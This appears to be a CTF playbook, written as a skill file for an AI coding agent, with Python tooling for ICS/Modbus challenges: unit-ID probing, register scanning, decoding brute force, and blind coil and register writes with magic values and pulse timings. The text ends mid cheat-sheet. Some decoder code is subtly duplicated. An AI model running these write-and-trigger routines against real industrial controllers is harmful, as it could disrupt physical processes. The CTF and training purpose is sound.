# 🛡️ ICS CTF Anti-AI Trap Detection Playbook

> **Version:** 3.0 Windsurf Edition  
> **Purpose:** ตรวจจับและหลีกเลี่ยง Trap ที่ AI สร้าง + ป้องกัน AI Hallucination  
> **Integration:** ใช้ร่วมกับ skill `ctf-ics` ใน Windsurf IDE

---

## 🚨 CRITICAL: Anti-Hallucination Protocol

ก่อนรัน solver ใดๆ ต้องปฏิบัติตามกฎเหล่านี้:

### Rule 1: Evidence-Based Execution Only

```
❌ FORBIDDEN:
- สมมติว่า flag อยู่ที่ address ใด โดยไม่มี evidence
- ใช้ Unit ID โดยไม่ probe ก่อน
- รายงาน flag ที่ไม่ได้มาจาก command output จริง
- ข้าม verification step

✅ REQUIRED:
- Probe Unit IDs ก่อนทุกครั้ง
- ยืนยัน response ก่อน decode
- ตรวจสอบ flag format ก่อนรายงาน
- เก็บ evidence ของทุก step
```

### Rule 2: Trap Detection Before Action

```python
# ทุกครั้งก่อน read/write ต้องตรวจ trap ก่อน
TRAP_CHECK_SEQUENCE = [
    "detect_tarpit",      # ตรวจ response time
    "detect_honeypot",    # ตรวจ decoy data
    "detect_rate_limit",  # ตรวจ throttling
    "verify_unit_id",     # ยืนยัน Unit ID ถูกต้อง
    "baseline_snapshot",  # เก็บ state ก่อน action
]
```

### Rule 3: Three-Strike Pivot Rule

```
ถ้าเจอ error เดิมซ้ำ 3 ครั้ง → PIVOT ทันที
- เปลี่ยน Unit ID
- เปลี่ยน address range
- เปลี่ยน encoding method
- เปลี่ยน protocol approach
```

---

## 🎯 Phase 0: Trap Detection Matrix

### 0.1 Automatic Trap Identification

เมื่อเชื่อมต่อกับ target ให้รัน trap detection ก่อน:

```bash
# Windsurf Command: Trap Detection Scan
/home/kali/Desktop/RTAF-CTF-2026/OT-Security-Lab/.venv/bin/python3 \
  /home/kali/Desktop/.windsurf/skills/ctf-ics/ics-ctf-trap-playbook/trap_detector.py \
  --ip <target_ip> --port <port> --full-scan --json
```

### 0.2 Trap Signature Database

| Trap Type | Detection Method | Bypass Strategy |
|-----------|------------------|------------------|
| **Tarpit** | Response > 1.0s | Skip address, try higher ranges |
| **Honeypot** | Returns `FAKE`, `DECOY`, `NOT_FLAG` | Filter with regex, verify checksum |
| **Rate Limit** | Connection reset after N requests | Add 200ms delay between requests |
| **Byte Swap** | Gibberish text output | Try CDAB, BADC, DCBA encodings |
| **Hidden Unit** | Unit 1 returns empty | Scan Unit IDs 42, 99, 100, 127, 247 |
| **State Gate** | Flag locked until write | Trigger coil/register first |
| **Challenge-Response** | Seed changes each read | Read-Compute-Write in <500ms |
| **TCP Fragment** | Incomplete response | Use recv_all() with length check |
| **PoW Block** | Hash challenge before access | Auto-solve with brute-force |
| **Precision Trap** | Float calculation mismatch | Use decimal.Decimal |

---

## 🔍 Phase 1: Pre-Flight Trap Detection

### 1.1 Tarpit Detection

```python
#!/usr/bin/env python3
"""
Trap Detector: Tarpit Detection
Integrates with: ctf-ics skill
"""

import time
import socket
import struct

class TarpitDetector:
    """
    ตรวจจับ Tarpit โดยวัด response time
    AI มักวาง tarpit ที่ address 0-20
    """
    
    TARPIT_THRESHOLD = 1.0  # seconds
    AI_TARPIT_ZONES = [
        (0, 20),    # Most common
        (0, 10),    # Aggressive
        (0, 50),    # Extended
    ]
    
    def __init__(self, host, port=502, timeout=2.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.tarpit_ranges = []
        self.safe_start = 0
    
    def detect(self, unit_id=1):
        """Scan for tarpit zones"""
        test_addresses = [0, 5, 10, 15, 20, 50, 100, 150, 200]
        baseline_times = []
        
        for addr in test_addresses:
            elapsed = self._measure_response_time(unit_id, addr)
            
            if elapsed is None:
                continue
            
            if elapsed > self.TARPIT_THRESHOLD:
                # Found tarpit!
                self.tarpit_ranges.append((addr, addr + 20))
                print(f"[TRAP] Tarpit detected at addr {addr}: {elapsed:.2f}s")
            else:
                baseline_times.append(elapsed)
                if not self.tarpit_ranges:
                    self.safe_start = addr
        
        # Calculate safe starting address
        if self.tarpit_ranges:
            max_tarpit_end = max(end for _, end in self.tarpit_ranges)
            self.safe_start = max_tarpit_end + 10
        
        return {
            'tarpit_detected': len(self.tarpit_ranges) > 0,
            'tarpit_ranges': self.tarpit_ranges,
            'safe_start_address': self.safe_start,
            'avg_baseline_time': sum(baseline_times) / len(baseline_times) if baseline_times else 0,
            'recommendation': f"Start scanning from address {self.safe_start}"
        }
    
    def _measure_response_time(self, unit_id, address):
        """Measure response time for single read"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            
            # Build Modbus request
            request = struct.pack('>HHHBBHH', 1, 0, 6, unit_id, 0x03, address, 1)
            
            start = time.time()
            sock.sendall(request)
            response = sock.recv(256)
            elapsed = time.time() - start
            
            sock.close()
            return elapsed
        except:
            return None
```

### 1.2 Honeypot/Decoy Detection

```python
class HoneypotDetector:
    """
    ตรวจจับ Honeypot/Decoy data
    AI มักใส่ข้อความหลอกเช่น FAKE, DECOY, NOT_THE_FLAG
    """
    
    DECOY_PATTERNS = [
        b'FAKE', b'DECOY', b'NOT_FLAG', b'NOT_THE_FLAG',
        b'WRONG', b'TRY_AGAIN', b'NOPE', b'INVALID',
        b'LOCKED', b'ACCESS_DENIED', b'UNAUTHORIZED',
        b'\x00' * 10,  # All zeros
        b'\xff' * 10,  # All ones
    ]
    
    FLAG_PATTERNS = [
        rb'coc2026\{[^}]+\}',
        rb'FLAG\{[^}]+\}',
        rb'CTF\{[^}]+\}',
        rb'flag\{[^}]+\}',
        rb'rtaf\{[^}]+\}',
    ]
    
    def __init__(self):
        self.decoys_found = []
        self.valid_candidates = []
    
    def analyze(self, data, source_info=""):
        """
        Analyze data for decoy patterns
        Returns: (is_valid, confidence, reason)
        """
        import re
        
        if isinstance(data, str):
            data = data.encode('utf-8', errors='replace')
        
        # Check for decoy patterns
        for pattern in self.DECOY_PATTERNS:
            if pattern in data.upper():
                self.decoys_found.append({
                    'source': source_info,
                    'pattern': pattern.decode('utf-8', errors='replace'),
                    'data_preview': data[:50].decode('utf-8', errors='replace')
                })
                return (False, 0.0, f"Decoy pattern detected: {pattern}")
        
        # Check for valid flag patterns
        for pattern in self.FLAG_PATTERNS:
            match = re.search(pattern, data, re.IGNORECASE)
            if match:
                flag = match.group(0).decode('utf-8', errors='replace')
                
                # Additional validation
                if self._validate_flag_structure(flag):
                    self.valid_candidates.append({
                        'source': source_info,
                        'flag': flag,
                        'confidence': 0.95
                    })
                    return (True, 0.95, f"Valid flag candidate: {flag}")
        
        return (None, 0.5, "No definitive pattern found")
    
    def _validate_flag_structure(self, flag):
        """Validate flag has proper structure"""
        # Check length (typical CTF flags are 20-60 chars)
        if len(flag) < 10 or len(flag) > 100:
            return False
        
        # Check for balanced braces
        if flag.count('{') != 1 or flag.count('}') != 1:
            return False
        
        # Check content is printable
        content = flag[flag.index('{')+1:flag.index('}')]
        if not all(c.isprintable() for c in content):
            return False
        
        return True
    
    def get_report(self):
        return {
            'decoys_found': len(self.decoys_found),
            'decoy_details': self.decoys_found,
            'valid_candidates': self.valid_candidates,
            'recommendation': self._get_recommendation()
        }
    
    def _get_recommendation(self):
        if self.valid_candidates:
            return f"Found {len(self.valid_candidates)} valid candidate(s). Verify with checksum if available."
        elif self.decoys_found:
            return f"Found {len(self.decoys_found)} decoy(s). Try different address ranges or Unit IDs."
        else:
            return "No patterns found. Try different encoding (CDAB, XOR, Base64)."
```

### 1.3 Endianness Auto-Detection

```python
class EndiannessDetector:
    """
    ตรวจจับ Endianness ที่ถูกต้องโดยอัตโนมัติ
    AI มักใช้ CDAB (byte swap) เป็น trap
    """
    
    ENCODINGS = {
        'ABCD': lambda regs: b''.join(r.to_bytes(2, 'big') for r in regs),
        'CDAB': lambda regs: b''.join(bytes([r & 0xFF, (r >> 8) & 0xFF]) for r in regs),
        'BADC': lambda regs: b''.join(
            bytes([(regs[i+1] >> 8) & 0xFF, (regs[i+1]) & 0xFF,
                   (regs[i] >> 8) & 0xFF, (regs[i]) & 0xFF])
            for i in range(0, len(regs) - 1, 2)
        ) if len(regs) >= 2 else b'',
        'DCBA': lambda regs: b''.join(r.to_bytes(2, 'little') for r in regs),
    }
    
    FLAG_PREFIXES = [b'coc2026{', b'FLAG{', b'CTF{', b'flag{', b'rtaf{']
    
    def detect(self, registers):
        """
        Try all encodings and return the one that produces valid flag
        """
        results = {}
        
        for name, encoder in self.ENCODINGS.items():
            try:
                decoded = encoder(registers)
                text = decoded.decode('utf-8', errors='replace')
                
                # Clean non-printable
                text_clean = ''.join(c if c.isprintable() else '' for c in text)
                
                results[name] = {
                    'raw_bytes': decoded.hex(),
                    'text': text_clean,
                    'has_flag': any(p.decode() in text_clean for p in self.FLAG_PREFIXES)
                }
                
                # Extract flag if found
                for prefix in self.FLAG_PREFIXES:
                    prefix_str = prefix.decode()
                    if prefix_str in text_clean:
                        start = text_clean.index(prefix_str)
                        try:
                            end = text_clean.index('}', start) + 1
                            results[name]['flag'] = text_clean[start:end]
                            results[name]['confidence'] = 0.95
                        except ValueError:
                            pass
            except Exception as e:
                results[name] = {'error': str(e)}
        
        # Find best encoding
        best = None
        for name, result in results.items():
            if result.get('has_flag') and result.get('flag'):
                best = name
                break
        
        return {
            'all_encodings': results,
            'detected_encoding': best,
            'recommendation': f"Use {best} encoding" if best else "Try XOR decoding"
        }
```

---

## 🔧 Phase 2: Automated Bypass Techniques

### 2.1 Universal Trap Bypass Workflow

```python
#!/usr/bin/env python3
"""
Universal Trap Bypass for Windsurf IDE
Integrates with: ctf-ics skill

Usage:
    python3 universal_bypass.py --ip <target> --port 502 --auto
"""

import argparse
import json
import time
import socket
import struct
from decimal import Decimal, getcontext

# High precision for GPS/float calculations
getcontext().prec = 50

class UniversalTrapBypass:
    """
    Automated trap detection and bypass
    Covers all AI-generated trap patterns
    """
    
    def __init__(self, host, port=502, timeout=2.0):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.flags_found = []
        self.traps_detected = []
        self.session_log = []
    
    def run_full_bypass(self):
        """Execute complete bypass sequence"""
        
        print("[*] Phase 1: Trap Detection")
        self._detect_all_traps()
        
        print("[*] Phase 2: Unit ID Discovery")
        active_units = self._discover_unit_ids()
        
        print("[*] Phase 3: Safe Register Scan")
        for unit_id in active_units:
            self._safe_register_scan(unit_id)
        
        print("[*] Phase 4: Encoding Brute-Force")
        self._try_all_encodings()
        
        print("[*] Phase 5: State Machine Crack")
        for unit_id in active_units:
            self._crack_state_machine(unit_id)
        
        print("[*] Phase 6: Timing Attack")
        for unit_id in active_units:
            self._timing_attack(unit_id)
        
        print("[*] Phase 7: Challenge-Response")
        for unit_id in active_units:
            self._solve_challenge_response(unit_id)
        
        return self._generate_report()
    
    def _detect_all_traps(self):
        """Detect all trap types"""
        
        # Tarpit detection
        tarpit = TarpitDetector(self.host, self.port, self.timeout)
        tarpit_result = tarpit.detect()
        if tarpit_result['tarpit_detected']:
            self.traps_detected.append({
                'type': 'tarpit',
                'details': tarpit_result
            })
            self.safe_start = tarpit_result['safe_start_address']
        else:
            self.safe_start = 0
        
        self._log(f"Tarpit detection complete. Safe start: {self.safe_start}")
    
    def _discover_unit_ids(self):
        """Discover active Unit IDs (AI favorites first)"""
        
        # AI favorite Unit IDs (ordered by probability)
        ai_favorite_units = [
            1,    # Default
            42,   # Hitchhiker's Guide (AI loves this)
            99,   # "Special" looking
            100,  # Round number
            127,  # Max signed byte
            200,  # Another round number
            247,  # Modbus max
            255,  # Broadcast
            13,   # "Unlucky"
            2, 10, 50  # Common alternatives
        ]
        
        active = []
        
        for uid in ai_favorite_units:
            # Test with safe address (skip tarpit)
            response = self._read_register(uid, self.safe_start + 100, 1)
            if response is not None:
                active.append(uid)
                self._log(f"Unit ID {uid} is active")
        
        if not active:
            self._log("[!] No active Unit IDs found with favorites, trying full scan")
            for uid in range(1, 248):
                if uid in ai_favorite_units:
                    continue
                response = self._read_register(uid, self.safe_start + 100, 1)
                if response is not None:
                    active.append(uid)
                    if len(active) >= 5:
                        break
        
        return active
    
    def _safe_register_scan(self, unit_id):
        """Scan registers, skipping tarpit zones"""
        
        honeypot = HoneypotDetector()
        endianness = EndiannessDetector()
        
        # Scan ranges (skip tarpit)
        scan_ranges = [
            (self.safe_start, self.safe_start + 100),
            (100, 200),
            (200, 300),
            (300, 400),
            (400, 500),
        ]
        
        for start, end in scan_ranges:
            for addr in range(start, end, 20):
                registers = self._read_register(unit_id, addr, 20)
                if registers is None:
                    continue
                
                # Skip all-zero
                if all(r == 0 for r in registers):
                    continue
                
                # Try all encodings
                encoding_result = endianness.detect(registers)
                
                if encoding_result['detected_encoding']:
                    for enc_name, enc_data in encoding_result['all_encodings'].items():
                        if enc_data.get('flag'):
                            # Verify not decoy
                            is_valid, conf, reason = honeypot.analyze(
                                enc_data['flag'].encode(),
                                f"Unit {unit_id}, Addr {addr}, Enc {enc_name}"
                            )
                            
                            if is_valid:
                                self.flags_found.append({
                                    'flag': enc_data['flag'],
                                    'unit_id': unit_id,
                                    'address': addr,
                                    'encoding': enc_name,
                                    'confidence': conf
                                })
                                self._log(f"[FLAG] {enc_data['flag']}")
    
    def _try_all_encodings(self):
        """Try XOR and other encodings on collected data"""
        
        # XOR keys that AI commonly uses
        xor_keys = [0x55, 0xAA, 0xFF, 0x42, 0x13, 0x37, 0x00]
        
        for data_item in self.session_log:
            if 'raw_data' not in data_item:
                continue
            
            raw = data_item['raw_data']
            
            for key in xor_keys:
                decoded = bytes(b ^ key for b in raw)
                text = decoded.decode('utf-8', errors='replace')
                
                for prefix in ['coc2026{', 'FLAG{', 'CTF{']:
                    if prefix in text:
                        try:
                            start = text.index(prefix)
                            end = text.index('}', start) + 1
                            flag = text[start:end]
                            self.flags_found.append({
                                'flag': flag,
                                'method': f'XOR key 0x{key:02X}',
                                'source': data_item.get('source', 'unknown')
                            })
                        except:
                            pass
    
    def _crack_state_machine(self, unit_id):
        """Try write-then-read patterns"""
        
        # Magic values AI commonly uses
        magic_values = [
            (100, 0xDEAD),
            (100, 0xBEEF),
            (100, 0x1337),
            (100, 0xFFFF),
            (100, 0x0001),
            (200, 0xCAFE),
            (0, 0xFFFF),
        ]
        
        # Coils to try
        trigger_coils = [0, 1, 10, 50, 99, 100]
        
        # Try coil triggers
        for coil in trigger_coils:
            # Snapshot before
            before = self._snapshot_registers(unit_id)
            
            # Write coil
            self._write_coil(unit_id, coil, True)
            time.sleep(0.3)
            
            # Check for changes
            after = self._snapshot_registers(unit_id)
            changes = self._find_changes(before, after)
            
            if changes:
                self._log(f"Coil {coil} triggered changes: {changes}")
                # Scan changed areas for flag
                for addr in changes:
                    self._safe_register_scan(unit_id)
        
        # Try magic value writes
        for addr, value in magic_values:
            before = self._snapshot_registers(unit_id)
            
            try:
                self._write_register(unit_id, addr, value)
            except:
                pass  # Exception trap - don't abort
            
            time.sleep(0.1)
            after = self._snapshot_registers(unit_id)
            changes = self._find_changes(before, after)
            
            if changes:
                self._log(f"Write {addr}=0x{value:04X} triggered changes")
                self._safe_register_scan(unit_id)
    
    def _timing_attack(self, unit_id):
        """Try pulse timing patterns"""
        
        # Timing values AI commonly uses (ordered by probability)
        timings = [0.5, 0.7, 1.0, 0.3, 0.8, 1.2, 1.5, 2.0, 0.1, 0.05]
        
        for coil in [0, 1, 10, 50, 100]:
            for duration in timings:
                # Pulse: ON -> wait -> OFF
                self._write_coil(unit_id, coil, True)
                time.sleep(duration)
                self._write_coil(unit_id, coil, False)
                time.sleep(0.1)
                
                # Check for flag
                self._safe_register_scan(unit_id)
                
                if self.flags_found:
                    self._log(f"Timing attack success: coil {coil}, duration {duration}s")
                    return
    
    def _solve_challenge_response(self, unit_id):
        """Solve challenge-response in single session"""
        
        # Common seed/response register pairs
        pairs = [
            (100, 101, 200),  # seed, response, flag
            (0, 1, 10),
            (50, 51, 100),
        ]
        
        # Algorithms AI commonly uses
        algorithms = [
            ('XOR 0xFF', lambda x: x ^ 0xFF),
            ('XOR 0xAA', lambda x: x ^ 0xAA),
            ('XOR 0x55', lambda x: x ^ 0x55),
            ('XOR 0xAA55', lambda x: x ^ 0xAA55),
            ('NOT', lambda x: (~x) & 0xFFFF),
            ('ADD 1', lambda x: (x + 1) & 0xFFFF),
            ('SUB 1', lambda x: (x - 1) & 0xFFFF),
            ('SWAP', lambda x: ((x & 0xFF) << 8) | ((x >> 8) & 0xFF)),
            ('MUL 2', lambda x: (x * 2) & 0xFFFF),
        ]
        
        for seed_reg, resp_reg, flag_reg in pairs:
            for algo_name, algo_func in algorithms:
                try:
                    # Read seed (FAST)
                    seed_data = self._read_register(unit_id, seed_reg, 1)
                    if seed_data is None:
                        continue
                    
                    seed = seed_data[0]
                    response = algo_func(seed)
                    
                    # Write response (FAST - within 500ms)
                    self._write_register(unit_id, resp_reg, response)
                    
                    # Read flag
                    time.sleep(0.05)
                    flag_data = self._read_register(unit_id, flag_reg, 20)
                    
                    if flag_data:
                        endianness = EndiannessDetector()
                        result = endianness.detect(flag_data)
                        
                        if result['detected_encoding']:
                            for enc_name, enc_data in result['all_encodings'].items():
                                if enc_data.get('flag'):
                                    self.flags_found.append({
                                        'flag': enc_data['flag'],
                                        'method': f'Challenge-Response ({algo_name})',
                                        'unit_id': unit_id
                                    })
                                    return
                except Exception as e:
                    pass
    
    # === Helper Methods ===
    
    def _read_register(self, unit_id, address, count):
        """Read holding registers with timeout protection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            
            request = struct.pack('>HHHBBHH', 1, 0, 6, unit_id, 0x03, address, count)
            sock.sendall(request)
            
            response = self._recv_all(sock, 9 + count * 2)
            sock.close()
            
            if len(response) < 9:
                return None
            
            if response[7] & 0x80:  # Exception
                return None
            
            byte_count = response[8]
            data = response[9:9+byte_count]
            
            registers = []
            for i in range(0, len(data), 2):
                if i + 1 < len(data):
                    registers.append(struct.unpack('>H', data[i:i+2])[0])
            
            # Log raw data for later analysis
            self.session_log.append({
                'type': 'read',
                'unit_id': unit_id,
                'address': address,
                'raw_data': data,
                'registers': registers
            })
            
            return registers
        except:
            return None
    
    def _write_register(self, unit_id, address, value):
        """Write single register"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            
            request = struct.pack('>HHHBBHH', 1, 0, 6, unit_id, 0x06, address, value)
            sock.sendall(request)
            
            response = sock.recv(256)
            sock.close()
            return True
        except:
            return False
    
    def _write_coil(self, unit_id, address, value):
        """Write single coil"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.timeout)
            sock.connect((self.host, self.port))
            
            coil_value = 0xFF00 if value else 0x0000
            request = struct.pack('>HHHBBHH', 1, 0, 6, unit_id, 0x05, address, coil_value)
            sock.sendall(request)
            
            response = sock.recv(256)
            sock.close()
            return True
        except:
            return False
    
    def _recv_all(self, sock, expected):
        """Receive exact bytes (handle TCP fragmentation)"""
        data = b''
        while len(data) < expected:
            try:
                chunk = sock.recv(expected - len(data))
                if not chunk:
                    break
                data += chunk
            except:
                break
        return data
    
    def _snapshot_registers(self, unit_id):
        """Take snapshot of key registers"""
        snapshot = {}
        for addr in [0, 50, 100, 150, 200, 250, 300]:
            data = self._read_register(unit_id, addr, 20)
            if data:
                for i, v in enumerate(data):
                    snapshot[(addr + i)] = v
        return snapshot
    
    def _find_changes(self, before, after):
        """Find registers that changed"""
        changes = []
        for addr in after:
            if addr not in before or before[addr] != after[addr]:
                if after[addr] != 0:  # Ignore zero changes
                    changes.append(addr)
        return changes
    
    def _log(self, message):
        """Log message"""
        print(f"[*] {message}")
        self.session_log.append({'message': message, 'time': time.time()})
    
    def _generate_report(self):
        """Generate final report"""
        return {
            'flags_found': self.flags_found,
            'traps_detected': self.traps_detected,
            'total_flags': len(self.flags_found),
            'unique_flags': list(set(f['flag'] for f in self.flags_found)),
            'session_summary': {
                'total_reads': len([l for l in self.session_log if l.get('type') == 'read']),
                'traps_bypassed': len(self.traps_detected)
            }
        }


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Universal Trap Bypass')
    parser.add_argument('--ip', required=True, help='Target IP')
    parser.add_argument('--port', type=int, default=502, help='Target port')
    parser.add_argument('--timeout', type=float, default=2.0, help='Timeout')
    parser.add_argument('--json', action='store_true', help='JSON output')
    
    args = parser.parse_args()
    
    bypass = UniversalTrapBypass(args.ip, args.port, args.timeout)
    result = bypass.run_full_bypass()
    
    if args.json:
        print(json.dumps(result, indent=2))
    else:
        print("\n" + "="*60)
        print("RESULTS")
        print("="*60)
        if result['flags_found']:
            for f in result['flags_found']:
                print(f"[FLAG] {f['flag']}")
        else:
            print("[-] No flags found")
```

---

## 📋 Phase 3: Windsurf IDE Integration

### 3.1 Quick Commands for Windsurf

```bash
# === TRAP DETECTION ===
# Run before any exploitation
/home/kali/Desktop/RTAF-CTF-2026/OT-Security-Lab/.venv/bin/python3 \
  /home/kali/Desktop/.windsurf/skills/ctf-ics/ics-ctf-trap-playbook/trap_detector.py \
  --ip <target_ip> --port <port> --full-scan --json

# === UNIVERSAL BYPASS ===
# Automated trap bypass + flag extraction
/home/kali/Desktop/RTAF-CTF-2026/OT-Security-Lab/.venv/bin/python3 \
  /home/kali/Desktop/.windsurf/skills/ctf-ics/ics-ctf-trap-playbook/universal_bypass.py \
  --ip <target_ip> --port <port> --auto --json

# === SAFE MODBUS READ (Skip Tarpit) ===
/home/kali/Desktop/RTAF-CTF-2026/OT-Security-Lab/.venv/bin/python3 \
  /home/kali/Desktop/.windsurf/skills/ctf-ics/tools/modbus/modbus_read_find_flags.py \
  --ip <target_ip> --port <port> --start-addr 50 --probe-units --json

# === CHALLENGE-RESPONSE SOLVER ===
/home/kali/Desktop/RTAF-CTF-2026/OT-Security-Lab/.venv/bin/python3 \
  /home/kali/Desktop/.windsurf/skills/ctf-ics/tools/modbus/modbus_stateful_decoder.py \
  --ip <target_ip> --port <port> --unit <unit_id> --decode-ranges "100:100,200:100,300:100,400:100" --json
```

### 3.2 AI Agent Decision Tree

```
┌─────────────────────────────────────────────────────────────────┐
│              WINDSURF AI AGENT DECISION TREE                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  START                                                          │
│    │                                                            │
│    ▼                                                            │
│  ┌─────────────────┐                                            │
│  │ Port Reachable? │──NO──> Check tunnel/proxy                  │
│  └────────┬────────┘                                            │
│           │YES                                                  │
│           ▼                                                     │
│  ┌─────────────────┐                                            │
│  │ Run Trap Detect │                                            │
│  └────────┬────────┘                                            │
│           │                                                     │
│           ▼                                                     │
│  ┌─────────────────┐                                            │
│  │ Tarpit Found?   │──YES──> Set safe_start = tarpit_end + 10  │
│  └────────┬────────┘                                            │
│           │NO                                                   │
│           ▼                                                     │
│  ┌─────────────────┐                                            │
│  │ Probe Unit IDs  │ (42, 99, 100, 127 first)                  │
│  └────────┬────────┘                                            │
│           │                                                     │
│           ▼                                                     │
│  ┌─────────────────┐                                            │
│  │ Read Registers  │ (skip tarpit zone)                        │
│  └────────┬────────┘                                            │
│           │                                                     │
│           ▼                                                     │
│  ┌─────────────────┐                                            │
│  │ Gibberish?      │──YES──> Try CDAB, BADC, DCBA, XOR         │
│  └────────┬────────┘                                            │
│           │NO                                                   │
│           ▼                                                     │
│  ┌─────────────────┐                                            │
│  │ Decoy Pattern?  │──YES──> Skip, try other addresses         │
│  └────────┬────────┘                                            │
│           │NO                                                   │
│           ▼                                                     │
│  ┌─────────────────┐                                            │
│  │ Flag Found?     │──YES──> Verify format, REPORT             │
│  └────────┬────────┘                                            │
│           │NO                                                   │
│           ▼                                                     │
│  ┌─────────────────┐                                            │
│  │ Try State Gate  │ (write coil/register first)               │
│  └────────┬────────┘                                            │
│           │                                                     │
│           ▼                                                     │
│  ┌─────────────────┐                                            │
│  │ Try Timing      │ (pulse 0.5s, 1.0s, 1.5s)                  │
│  └────────┬────────┘                                            │
│           │                                                     │
│           ▼                                                     │
│  ┌─────────────────┐                                            │
│  │ Try Challenge   │ (read-compute-write <500ms)               │
│  │ Response        │                                            │
│  └────────┬────────┘                                            │
│           │                                                     │
│           ▼                                                     │
│  ┌─────────────────┐                                            │
│  │ 3 Failures?     │──YES──> PIVOT to different approach       │
│  └────────┬────────┘                                            │
│           │NO                                                   │
│           ▼                                                     │
│       LOOP BACK                                                 │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 🛡️ Phase 4: AI Hallucination Prevention

### 4.1 Hallucination Detection Rules

```python
class HallucinationGuard:
    """
    ป้องกัน AI Hallucination ใน CTF solving
    """
    
    HALLUCINATION_PATTERNS = [
        # Fake flag patterns
        r'flag\{example\}',
        r'FLAG\{test\}',
        r'coc2026\{placeholder\}',
        
        # Impossible values
        r'Unit ID 999',
        r'address 99999',
        r'port 99999',
        
        # Generic responses
        r'the flag is',
        r'flag should be',
        r'flag might be',
        r'probably the flag',
    ]
    
    def validate_flag_claim(self, claimed_flag, evidence):
        """
        Validate that a claimed flag has proper evidence
        
        Args:
            claimed_flag: The flag being claimed
            evidence: Dict with command, output, timestamp
        
        Returns:
            (is_valid, reason)
        """
        import re
        
        # Rule 1: Must have command evidence
        if 'command' not in evidence:
            return (False, "No command evidence provided")
        
        # Rule 2: Must have output evidence
        if 'output' not in evidence:
            return (False, "No output evidence provided")
        
        # Rule 3: Flag must appear in output
        if claimed_flag not in evidence['output']:
            return (False, "Flag not found in command output")
        
        # Rule 4: Check for hallucination patterns
        for pattern in self.HALLUCINATION_PATTERNS:
            if re.search(pattern, claimed_flag, re.IGNORECASE):
                return (False, f"Hallucination pattern detected: {pattern}")
        
        # Rule 5: Validate flag format
        if not re.match(r'^[a-zA-Z0-9_]+\{[^}]+\}$', claimed_flag):
            return (False, "Invalid flag format")
        
        return (True, "Flag validated with evidence")
    
    def validate_unit_id(self, unit_id, probe_result):
        """
        Validate Unit ID was actually probed
        """
        if probe_result is None:
            return (False, "Unit ID not probed")
        
        if unit_id not in probe_result.get('active_units', []):
            return (False, f"Unit ID {unit_id} not in active list")
        
        return (True, "Unit ID validated")
    
    def validate_address(self, address, scan_result):
        """
        Validate address was actually scanned
        """
        if scan_result is None:
            return (False, "Address not scanned")
        
        scanned_ranges = scan_result.get('scanned_ranges', [])
        for start, end in scanned_ranges:
            if start <= address <= end:
                return (True, "Address in scanned range")
        
        return (False, f"Address {address} not in scanned ranges")
```

### 4.2 Evidence Collection Template

```python
class EvidenceCollector:
    """
    Collect evidence for every action
    Required for anti-hallucination
    """
    
    def __init__(self):
        self.evidence_log = []
    
    def record_action(self, action_type, command, output, result):
        """
        Record action with full evidence
        """
        import time
        import hashlib
        
        evidence = {
            'timestamp': time.time(),
            'action_type': action_type,
            'command': command,
            'output': output,
            'result': result,
            'output_hash': hashlib.sha256(str(output).encode()).hexdigest()[:16]
        }
        
        self.evidence_log.append(evidence)
        return evidence
    
    def get_flag_evidence(self, flag):
        """
        Get evidence for a specific flag
        """
        for evidence in self.evidence_log:
            if flag in str(evidence.get('output', '')):
                return evidence
        return None
    
    def generate_report(self):
        """
        Generate evidence report
        """
        return {
            'total_actions': len(self.evidence_log),
            'actions_by_type': self._count_by_type(),
            'flags_with_evidence': self._get_flags_with_evidence(),
            'full_log': self.evidence_log
        }
    
    def _count_by_type(self):
        counts = {}
        for e in self.evidence_log:
            t = e.get('action_type', 'unknown')
            counts[t] = counts.get(t, 0) + 1
        return counts
    
    def _get_flags_with_evidence(self):
        import re
        flags = []
        for e in self.evidence_log:
            output = str(e.get('output', ''))
            matches = re.findall(r'[a-zA-Z0-9_]+\{[^}]+\}', output)
            for m in matches:
                flags.append({
                    'flag': m,
                    'evidence_hash': e['output_hash'],
                    'command': e['command']
                })
        return flags
```

---

## 📊 Phase 5: Trap Bypass Cheat Sheet

```
┌─────────────────────────────────────────────────────────────────┐
│                    TRAP BYPASS CHEAT SHEET                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  TRAP: Tarpit (Response > 1s)                                   │
│  ├── Detection: Measure response time                           │
│  ├── Bypass: Skip address 0-20, start from 50+                 │
│  └── Command: --start-addr 50                                   │
│                                                                 │
│  TRAP: Hidden Unit ID                                           │
│  ├── Detection: Unit 1 returns empty                            │
│  ├── Bypass: Try 42, 99, 100, 127, 247                         │
│  └── Command: --probe-units                                     │
│                                                                 │
│  TRAP: Byte Swap (CDAB)                                         │
│  ├── Detection: Gibberish text                                  │
│  ├── Bypass: Try all 4 encodings                               │
│  └── Command: --try-all-endianness                              │
│                                                                 │
│  TRAP: XOR Encoding                                             │
│  ├── Detection: Non-printable after decode                      │
│  ├── Bypass: XOR with 0x55, 0xAA, 0xFF, 0x42                   │
│  └── Command: --xor-brute                                       │
│                                                                 │
│  TRAP: State Gate (Write-Then-Read)                             │
│  ├── Detection: Flag register returns LOCKED                    │
│  ├── Bypass: Write magic value first                           │
│  └── Command: --trigger-coil 99 --magic 0xDEAD                  │
│                                                                 │
│  TRAP: Pulse Timing                                             │
│  ├── Detection: Coil write has no effect                        │
│  ├── Bypass: ON -> wait 0.5-1.5s -> OFF                        │
│  └── Command: --pulse-timing 0.5,0.7,1.0,1.5                    │
│                                                                 │
│  TRAP: Challenge-Response                                       │
│  ├── Detection: Seed changes each read                          │
│  ├── Bypass: Read-Compute-Write in <500ms                      │
│  └── Command: --challenge-response --algo XOR                   │
│                                                                 │
│  TRAP: TCP Fragmentation                                        │
│  ├── Detection: Incomplete response                             │
│  ├── Bypass: Use recv_all() with length check                  │
│  └── Command: --robust-recv                                     │
│                                                                 │
│  TRAP: Decoy/Honeypot                                           │
